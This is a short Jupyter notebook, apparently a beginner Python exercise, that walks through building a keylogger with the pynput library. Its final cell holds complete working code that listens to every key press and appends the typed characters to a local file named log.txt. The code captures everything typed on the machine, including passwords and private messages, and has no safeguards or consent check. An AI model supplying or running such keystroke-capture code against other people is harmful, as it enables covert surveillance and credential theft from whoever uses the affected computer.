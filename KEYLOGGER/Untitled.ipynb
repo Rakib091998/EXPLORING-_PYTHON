{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# A simple python program to keylog using pynput library "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [],
   "source": [
    "# requirements:\n",
    "#      1.python basics for reading and writing using 'with' keyword files(link: https://www.geeksforgeeks.org/with-statement-in-python/)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [],
   "source": [
    "# pynput library is used to save typed keyword  and control mouse and keyboard( link : https://pypi.org/project/pynput/)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [],
   "source": [
    "# 'pip install pynput' to install pynput library \n",
    "from pynput.keyboard import Listener"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "def write_to_file(key):\n",
    "    letter = str(key)\n",
    "    letter = letter.replace(\"'\", \"\")\n",
    "\n",
    "    if letter == 'Key.space':\n",
    "        letter = ' '\n",
    "    if letter == 'Key.shift_r':\n",
    "        letter = ''\n",
    "    if letter == \"Key.ctrl_l\":\n",
    "        letter = \"\"\n",
    "    if letter == \"Key.enter\":\n",
    "        letter = \"\\n\"\n",
    "\n",
    "    with open(\"log.txt\", 'a') as f:\n",
    "        f.write(letter)\n",
    "\n",
    "# collecting events until stopped\n",
    "\n",
    "with Listener(on_press=write_to_file) as l:\n",
    "    l.join()"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.7.4"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
